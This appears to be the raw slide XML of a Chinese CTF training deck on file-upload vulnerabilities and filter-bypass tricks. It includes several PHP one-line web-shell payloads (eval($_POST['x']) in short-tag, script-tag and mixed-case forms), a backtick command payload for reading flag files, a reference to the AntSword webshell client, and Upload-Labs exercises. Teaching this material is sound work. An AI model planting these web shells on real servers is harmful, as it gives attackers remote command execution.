              <a:t>利用短标签绕过：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    &lt;?=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>表达式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    &lt;?=eval($_POST['x']);?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>换用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>语言绕过：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    &lt;script language="php"&gt;eval($_POST['x']);&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>利用大小写绕过：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    &lt;?PhP eval($_POST['x']);?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7305675" y="2197100"/>
            <a:ext cx="4262755" cy="2584450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>过滤：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>利用反引号绕过。在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中，使用反引号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> `command` </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的方式可以执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令，并将命令的输出作为字符串返回。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&lt;?=`tac ../f*`?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>[]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>过滤：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{ } </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>可以替代</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> [ ]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"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工具</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:sym typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="文本框 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="2301875"/>
            <a:ext cx="6986270" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>https://m5e1ff9fy3.feishu.cn/wiki/R5bywGTgGiqGCzkFKekckoZenkf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="1497330" cy="460375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1">
              <a:lumMod val="75000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="28575" cmpd="sng">
            <a:solidFill>
              <a:schemeClr val="accent1">
                <a:shade val="50000"/>
              </a:schemeClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
            <a:extLst>
              <a:ext uri="{4A0BC546-FE56-4ADE-93B0-CB8AF2F6F144}">
                <wpsdc:textFrameExt xmlns:wpsdc="http://www.wps.cn/officeDocument/2022/drawingmlCustomData" type="text"/>
              </a:ext>
            </a:extLst>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>蚁剑</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>下载</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="图片 10"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="3261995"/>
            <a:ext cx="3657600" cy="23812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思考</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1617980" y="2240915"/>
            <a:ext cx="8863965" cy="2553335"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>某网站上传文件时，会先将文件保存到服务器目录，然后再进行安全检测。如果检测失败系统会删除该文件。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>这种现象通常说明服务器可能存在什么类型的漏洞？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-U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endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1741805" y="2767965"/>
            <a:ext cx="9041765" cy="1322070"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4000" dirty="0"/>
              <a:t>完成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4000" dirty="0"/>
              <a:t>https://buuoj.cn/challenges#Upload-Labs-Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4000" dirty="0"/>
              <a:t>中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4000" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1976120" y="4201160"/>
            <a:ext cx="8239760" cy="460375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Pass01</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Pass02</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Pass03</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Pass04</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Pass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>08</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Pass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/tags/tag1.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="COMMONDATA" val="eyJoZGlkIjoiODEyYmZmZGRjNzBkOTkwMWU5MjMzY2I3Y2EzZDY4ZWEifQ=="/>
</p:tagLst>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="主题5">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毕业主题5</Template>
  <TotalTime>0</TotalTime>
  <Words>4373</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>265</Paragraphs>
  <Slides>16</Slides>
  <Notes>30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Arial</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>主题5</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>文件上传入门</vt:lpstr>
      <vt:lpstr>文件上传入门</vt:lpstr>
      <vt:lpstr>文件上传入门</vt:lpstr>
      <vt:lpstr>文件上传入门</vt:lpstr>
      <vt:lpstr>文件上传入门</vt:lpstr>
      <vt:lpstr>文件上传入门</vt:lpstr>
      <vt:lpstr>绕过技巧</vt:lpstr>
      <vt:lpstr>绕过技巧</vt:lpstr>
      <vt:lpstr>绕过技巧</vt:lpstr>
      <vt:lpstr>绕过技巧</vt:lpstr>
      <vt:lpstr>绕过技巧</vt:lpstr>
      <vt:lpstr>绕过技巧</vt:lpstr>
      <vt:lpstr>绕过技巧</vt:lpstr>
      <vt:lpstr>思考</vt:lpstr>
      <vt:lpstr>练习</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Hannibal0x</dc:creator>
  <cp:lastModifiedBy>张嘉杰</cp:lastModifiedBy>
  <cp:revision>5445</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-06-10T04:51:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-23T15:30:26Z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y fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-12.1.0.23542</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="ICV">
    <vt:lpwstr>E0828584C356420EA2D6B16AB4D5A84D_13</vt:lpwstr>
  </property>
</Properties>
</file>